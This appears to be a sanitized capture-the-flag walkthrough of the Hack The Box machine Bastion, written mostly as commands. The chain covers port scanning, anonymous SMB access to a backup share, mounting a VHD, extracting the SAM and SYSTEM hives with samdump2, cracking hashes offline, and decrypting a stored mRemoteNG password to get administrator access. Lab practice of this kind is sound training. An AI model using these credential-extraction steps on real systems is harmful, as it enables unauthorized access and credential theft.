# HTB: Bastion (SMB/VHD/mRemoteNG) — Evidence (Sanitized, text-only)

Timestamp (UTC): <YYYY-MM-DD HH:MM:SS UTC>
Environment: Linux <host> <kernel_version> #1 SMP <date> <arch>
Tool versions:
- Nmap 7.94SVN
- smbclient
- libguestfs (guestmount)
- samdump2
- John the Ripper / hashcat

# VPN / Reachability
sudo openvpn <vpn_name>.ovpn
ping <TARGET_IP>

# Scans (commands + sanitized outputs)
sudo nmap -p- -sV -sC -T4 <TARGET_IP>
PORT    STATE SERVICE
22/tcp  open  ssh
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

# SMB (sanitized)
smbclient -N -L //<TARGET_IP>/
# Backups share (unauthenticated)
smbclient -N //<TARGET_IP>/Backups
# .vhd under WindowsImageBackup\<host>\Backup <date>\

# Credential access (sanitized)
guestmount --add <backup>.vhd --inspector --ro /mnt/vhd
cp /mnt/vhd/Windows/System32/config/{SAM,SYSTEM} .
samdump2 SYSTEM SAM
# l4mpje:1000:...:<NTLM_REDACTED>:::   → cracked offline (<REDACTED>)

# Foothold (sanitized)
ssh l4mpje@<TARGET_IP>        # password: <REDACTED>

# Privilege escalation (sanitized)
type %APPDATA%\mRemoteNG\confCons.xml     # encrypted stored password
# public decryptor → Administrator password (<REDACTED>)
ssh administrator@<TARGET_IP>

# Notes
- Replace placeholders <TARGET_IP>, <backup>.
- Do not include flags/credentials; keep sensitive values as <REDACTED>.
